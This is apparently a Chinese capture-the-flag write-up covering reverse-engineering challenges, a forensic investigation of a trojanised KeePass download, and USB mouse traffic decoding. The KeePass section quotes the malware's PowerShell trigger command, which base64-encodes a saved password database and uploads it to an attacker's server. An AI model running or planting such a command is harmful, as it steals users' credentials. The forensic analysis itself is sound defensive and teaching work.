---
title: 2025年黑龙江省大学生网络安全挑战赛WriteUp
typora-root-url: 2025-heilongjiang-province
date: 2025-09-20 19:41:12
tags:
- re
- reverse
- misc
- 2025
categories: Reverse
---

# 2025年黑龙江省大学生网络安全挑战赛WriteUp

## Reverse

### REVERSE-1

![image-20250920103108989](image-20250920103108989.png)

IDA打开，手动设置显示为字符，注意小端序

![image-20250920103146420](image-20250920103146420.png)

### REVERSE-2

![image-20250920103244243](image-20250920103244243.png)

一处花指令阻止IDA函数的识别，处理后反编译如下：

![image-20250920105625450](image-20250920105625450.png)

提取buffer并解密，编写脚本如下：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	unsigned char buffer[] =
	{
	  0x51, 0x7D, 0xE1, 0x4C, 0x43, 0x8A, 0xDE, 0xDC, 0x48, 0x8F, 
	  0x07, 0xE2, 0x1F, 0xC0, 0x42, 0x0D, 0xAE, 0xEE, 0x79, 0x99, 
	  0xDA, 0x53, 0x74, 0x5A, 0xF7, 0x5F, 0x14, 0xF9, 0xBC, 0x01, 
	  0xDA, 0x77, 0x9F, 0xD5, 0xE3, 0x4E, 0x65, 0x02, 0xE9, 0x2A
	};
	srand(0xDEADBEEF);
	for (int i = 0; i < 40; i += 2)
	{
		int num = rand() % 255;
		buffer[i] ^= buffer[i + 1];
		buffer[i + 1] += (buffer[i]) ^ num;
		buffer[i] -= num;
	}
	
	printf("%s\n", buffer);
	return 0;
}
```

运行后得出flag

![image-20250920105612568](image-20250920105612568.png)

## Misc

### KeePass数据泄露-1

要求找到其他用户，分析http流量，发现online-list：

![image-20250920152845890](image-20250920152845890.png)

`JusticeEnforcement-DeepMountains-nullSecurity-zhaowendao`

### KeePass数据泄露-2

要求找到诱导agiao下载的时间，分析流量，梳理出如下对话：

![image-20250920160425223](image-20250920160425223.png)

参考过滤规则：

```plaintext
http &&( _ws.col.info contains "updated" || _ws.col.info contains "message" || (_ws.col.info contains "200" && json.key contains "updated" && json.value.string contains "\\"))
```

### KeePass数据泄露-3

要求找到每次保存密码时，密码还会被另存为到的路径

这里涉及到了对下载到的keepass的分析，wireshark中导出从`124.221.70.199`下载到的文件：

![image-20250920161935152](image-20250920161935152.png)

压缩包内容如下：

![image-20250920162024016](image-20250920162024016.png)

发现可执行文件的修改日期几乎都是2023年，只有两个目录和config文件的修改日期是2024年

打开`KeePass.config.xml`文件，发现了缩进不协调的内容：

![image-20250920162133046](image-20250920162133046.png)

如果在keepass中运行，发现触发器功能，窗口如下：

![image-20250920162231405](image-20250920162231405.png)

描述了上方配置文件中的内容的作用，我们也获取到了该题的flag

`c:\users\administrator\appdata\local\temp\giao.xml`

### KeePass数据泄露-4

在上一题的触发器中，我们发现了如下执行指令：

```powershell
PowerShell.exe -ex bypass -noprofile -c Invoke-WebRequest -uri http://124.221.70.199:8866/giao.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\administrator\AppData\Local\Temp\giao.xml')))
```

如上指令，将另存的数据库转为base64上传到了服务器上，在wireshark中导出

![image-20250920162724253](image-20250920162724253.png)

base64解码后，定位到如下处：

![image-20250920162544380](image-20250920162544380.png)

即得知远程服务器的账号密码

### MISC-1

![image-20250920145245579](image-20250920145245579.png)

kafuka压缩包中存在一个加密的图片，经分析非伪加密，开始分析`ciphertext.png`

![image-20250920145332690](image-20250920145332690.png)+

提示IDAT中有一个块出现了CRC校验错误，同时发现这个块的大小与正常严重不符，删除这个块，发现图片仍可正常查看

提取这个块的数据，如下：

![image-20250920145450546](image-20250920145450546.png)

发现文件头部是PNG文件的尾部逆序，处理后如下：

![image-20250920150656760](image-20250920150656760.png)

发现藏了一张图片的对应表，翻译后得到压缩包密码`Kafkaisthebest`，解压图片后得到flag：

![image-20250920150747915](image-20250920150747915.png)

### MISC-2

与网上的4字节数据包不同，这个鼠标抓取到的协议是6字节的：

![image-20250927144447488](image-20250927144447488.png)

搜索资料得知，这种是报告协议，数据包的结构在报告描述符中有说明，果然在开头发现了报告描述符

![image-20250927145020434](image-20250927145020434.png)

各个含义详见参考资料中的引用文章

根据报告描述符中对数据包结构的描述，可以计算出数据大小：

`5 * 1 + 1 * 3 + 12 * 2 + 8 * 1 = 40（bit）= 5bytes`

而实际捕获的数据为6字节，因为第一个字节是Report ID，可以忽略

修改现成的脚本[USB-Mouse-Pcap-Visualizer](https://github.com/WangYihang/USB-Mouse-Pcap-Visualizer)，使其可以解析6字节的数据，关键解析代码如下（AI编写）：

```python
def parse_hid_mouse_report(data, has_report_id=True):
    """
    解析 HID 鼠标报告
    
    参数:
        data: bytes 或 list，例如 b'\x01\x01\x01\x10\x00\x00' 或 [1, 1, 1, 16, 0, 0]
        has_report_id: bool，若第一个字节是 Report ID 则为 True（默认）
    
    返回:
        dict: 包含 buttons, x, y, wheel 的解析结果
    """
    if isinstance(data, list):
        data = bytes(data)
    
    # 跳过 Report ID（如果存在）
    payload = data[1:] if has_report_id else data
    
    if len(payload) != 5:
        raise ValueError(f"Expected 5-byte payload, got {len(payload)} bytes")
    
    # 将 5 字节展开为 40 位的位流（bit 0 到 39）
    # 规则：每个字节内部 bit0 (LSB) 是该字节的第 0 位
    bits = []
    for byte in payload:
        for i in range(8):  # i=0 是 LSB
            bits.append((byte >> i) & 1)
    # 现在 bits[0] = bit0, bits[1] = bit1, ..., bits[39] = bit39

    # 提取按钮（bit 0-4）
    buttons = [bits[i] for i in range(5)]  # [B1, B2, B3, B4, B5]

    # 提取 X（bit 8-19，共12位）
    x = 0
    for i in range(12):
        if bits[8 + i]:
            x |= (1 << i)
    # 转为有符号 12 位整数
    if x >= (1 << 11):
        x -= (1 << 12)

    # 提取 Y（bit 20-31，共12位）
    y = 0
    for i in range(12):
        if bits[20 + i]:
            y |= (1 << i)
    if y >= (1 << 11):
        y -= (1 << 12)

    # 提取 Wheel（bit 32-39，8位有符号）
    wheel = 0
    for i in range(8):
        if bits[32 + i]:
            wheel |= (1 << i)
    if wheel >= (1 << 7):
        wheel -= (1 << 8)

    return {
        "buttons": {
            "left": bool(buttons[0]),
            "right": bool(buttons[1]),
            "middle": bool(buttons[2]),
            "btn4": bool(buttons[3]),
            "btn5": bool(buttons[4]),
        },
        "x": x,
        "y": y,
        "wheel": wheel,
        "raw_buttons": buttons,
    }
```

修改部分：

```python
def parse_packet(payload):
    items = [struct.unpack('b', bytes.fromhex(i))[0]
             for i in payload.split(":")]

    state, movement_x, movement_y = 0, 0, 0

    if len(items) == 4:
        state, movement_x, movement_y, _ = items

    if len(items) == 6:
        _, state, _, _, _, _,= items

    a = parse_hid_mouse_report(bytes.fromhex(payload.replace(':', '')))

    movement_x = a['x']
    movement_y = a['y']

    left_button_holding = state & Opcode.LEFT_BUTTON_HOLDING.value != 0
    right_button_holding = state & Opcode.RIGHT_BUTTON_HOLDING.value != 0

    return movement_x, movement_y, left_button_holding, right_button_holding
```

最后利用工具自带的绘图网页进行绘图，如下：

<img src="GIF 2025-9-27 14-58-18.gif" alt="GIF 2025-9-27 14-58-18" />

得到字符串：`USB2004113`

## 参考资料

[USB HID 流量分析详解](https://www.morphedge.com/archives/usb-hid-traffic-analysis#)

[USB协议详解第10讲（USB描述符-报告描述符）-CSDN博客](https://blog.csdn.net/weiaipan1314/article/details/112504129)

[WangYihang/USB-Mouse-Pcap-Visualizer: USB mouse traffic packet forensic tool, mainly used to draw mouse movements and dragging trajectories](https://github.com/WangYihang/USB-Mouse-Pcap-Visualizer)
